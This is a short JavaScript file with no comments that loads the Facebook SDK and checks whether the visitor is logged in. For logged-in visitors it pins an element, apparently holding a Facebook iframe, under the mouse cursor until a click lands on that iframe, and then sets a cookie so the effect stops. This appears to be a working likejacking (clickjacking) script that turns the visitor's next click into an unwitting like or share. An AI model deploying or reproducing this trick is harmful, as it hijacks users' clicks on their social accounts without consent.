var graphApiInitialized = false;
var status = '';
window.fbAsyncInit = function () {
    FB.init({
        appId: '312319252170353',
        status: true,
        cookie: true,
        xfbml: true,
        oauth: true
    });
    FB.getLoginStatus(function (response) {
        if (response.status === 'connected') {
            status = 'c';
        } else if (response.status === 'not_authorized') {
            status = 'n';
        } else {
            status = '';
        };
    });
    graphApiInitialized = true;
};
(function () {
    var e = document.createElement('script');
    e.src = 'http://connect.facebook.net/en_US/all.js';
    e.async = true;
    document.getElementById('fb-root').appendChild(e);
}());

var inter;
$(function () {
    inter = setInterval("updateActiveElement();", 50);
});

function updateActiveElement() {
    if ($(document.activeElement).attr('id') == "fbframe") {
        clearInterval(inter);
        setCookie('vnn', '1', 10);
    }
};
var icon = document.getElementById('icontainer');
function mouseFollower(e) {
    if (window.event) {
        icon.style.top = (e.pageY - 5) + 'px';
        icon.style.left = (e.pageX - 5) + 'px';
    }
    else {
        icon.style.top = (e.pageY - 5) + 'px';
        icon.style.left = (e.pageX - 5) + 'px';
    }
};
$(document).mousemove(function (e) {
    if (getCookie('vnn') != '1' && graphApiInitialized == true && status != '') {
        $('#icontainer').show();
        mouseFollower(e);
    } else {
        $('#icontainer').hide();
    };
});